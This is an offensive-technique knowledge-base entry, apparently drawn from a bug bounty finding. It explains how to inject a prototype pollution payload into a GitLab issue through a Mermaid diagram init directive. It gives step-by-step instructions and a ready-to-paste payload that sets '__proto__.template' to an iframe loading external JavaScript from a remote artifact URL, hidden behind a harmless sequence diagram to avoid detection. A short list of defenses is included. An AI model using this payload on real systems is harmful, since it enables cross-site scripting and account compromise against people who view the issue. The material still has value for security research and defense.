---
tags:
  - mermaid
  - prototype-pollution
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.592Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: d4b67402-4189-4cee-bdf0-5b0ae72e52ad
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Embed-Malicious-Mermaid-Diagram-in-Issue

## Summary

This procedure details injecting a prototype pollution payload into a GitLab issue via a Mermaid diagram's init directive, polluting the global Object prototype to set a malicious template for XSS execution.

## Description

Mermaid, a JavaScript-based diagramming tool integrated into GitLab's markdown renderer, processes init directives without sanitizing properties like '__proto__', allowing attackers to modify the global prototype. This leads to injection of an iframe containing external JavaScript when the template is later invoked. The procedure assumes an existing issue from prior steps and targets authenticated users with edit permissions. Outcomes include a seemingly benign diagram that triggers XSS on view.

## Requirements

1. Existing GitLab issue with edit access
2. Knowledge of the target external JavaScript payload URL
3. Web browser for editing the issue markdown

## Defense

Defensive measures and detection strategies:

- Sanitize Mermaid init configurations to block '__proto__' and similar properties
- Use Content Security Policy (CSP) to restrict iframe and script sources
- Scan issue content for suspicious init directives in real-time

## Objectives

1. Pollute the global prototype with a malicious template
2. Hide the payload within a valid Mermaid diagram
3. Ensure the diagram renders without errors to avoid detection

## Instructions

### Step 1: Edit Issue Description

**Context**: Open the issue for modification to insert the payload.

Navigate to the created issue and click the edit icon on the description field.

> This enables markdown editing mode.

### Step 2: Insert Malicious Mermaid Code

**Context**: Embed the init directive to achieve prototype pollution.

Paste the following code into the description:

````markdown
%%{init: { "__proto__": { "template": "<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"<script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js></script>\">" } } }%%
sequenceDiagram
    Alice->>Bob: Hi Bob
    Bob->>Alice: Hi Alice
````

Click "Save changes".

> The payload sets '__proto__.template' to an iframe sourcing external JS, disguised by a simple sequence diagram.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[mermaid]]
- [[prototype-pollution]]
- [[payload-injection]]
